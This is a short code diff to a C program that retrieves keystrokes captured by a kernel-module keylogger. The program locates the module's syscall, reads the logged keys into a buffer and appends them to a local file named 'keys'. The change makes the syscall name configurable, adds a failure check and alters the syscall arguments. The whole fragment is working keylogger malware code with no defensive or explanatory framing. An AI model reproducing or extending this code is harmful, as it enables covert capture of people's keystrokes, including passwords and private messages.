@@ -6,6 +6,10 @@
 #include <stdio.h>
 #include <unistd.h>
 
+#ifndef SYSCALL_NAME
+#define SYSCALL_NAME "sys/logging"
+#endif
+
 #ifndef OUTPUT_FILE
 #define OUTPUT_FILE "./keys"
 #endif
@@ -20,9 +24,15 @@ main(int argc, char **argv)
 
 	/* Get the keylogged output to user space */
 	stat.version = sizeof(stat);
-	modstat(modfind("sys/logging"), &stat);
+	modstat(modfind(SYSCALL_NAME), &stat);
 	call = stat.data.intval;
-	syscall(call, buf, 512);
+
+	printf("%d\n", call);
+	if (call == 0)
+		return 1;
+
+/*	syscall(call, OUTPUT_FILE, buf, 512);*/
+	syscall(call, (char*)2, buf, 512);
 
 	/* Write it to a file */
 	fp = fopen(OUTPUT_FILE, "a");
